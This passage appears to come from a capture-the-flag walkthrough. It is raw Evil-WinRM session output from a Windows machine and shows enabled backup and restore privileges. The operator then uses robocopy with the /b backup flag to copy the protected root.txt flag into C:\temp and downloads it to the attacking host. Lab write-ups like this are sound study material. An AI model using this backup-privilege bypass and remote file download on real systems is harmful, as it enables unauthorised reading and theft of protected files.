----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\Administrator\Desktop> robocopy C:\Users\Administrator\Desktop C:\temp root.txt /b

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Friday, December 6, 2024 9:10:59 AM
   Source : C:\Users\Administrator\Desktop\
     Dest : C:\temp\

    Files : root.txt

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

	  New Dir          1	C:\Users\Administrator\Desktop\
	    New File  		      34	root.txt
  0%
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         1         0         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :        34        34         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :               2,266 Bytes/sec.
   Speed :               0.130 MegaBytes/min.
   Ended : Friday, December 6, 2024 9:10:59 AM

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cd C:\
*Evil-WinRM* PS C:\> ls


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         8/22/2024  11:45 AM                PerfLogs
d-r---         8/29/2024  12:32 PM                Program Files
d-----          5/8/2021   2:40 AM                Program Files (x86)
d-----         3/14/2024   5:21 AM                Shares
d-r---         8/30/2024  10:06 AM                temp
d-r---         8/26/2024   1:11 PM                Users
d-----         9/23/2024   9:35 AM                Windows


*Evil-WinRM* PS C:\> cd temp
*Evil-WinRM* PS C:\temp> ls


    Directory: C:\temp


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         12/6/2024   1:27 AM             34 root.txt


*Evil-WinRM* PS C:\temp> download root.txt
                                        
Info: Downloading C:\temp\root.txt to root.txt
                                        
Info: Download successful!

```
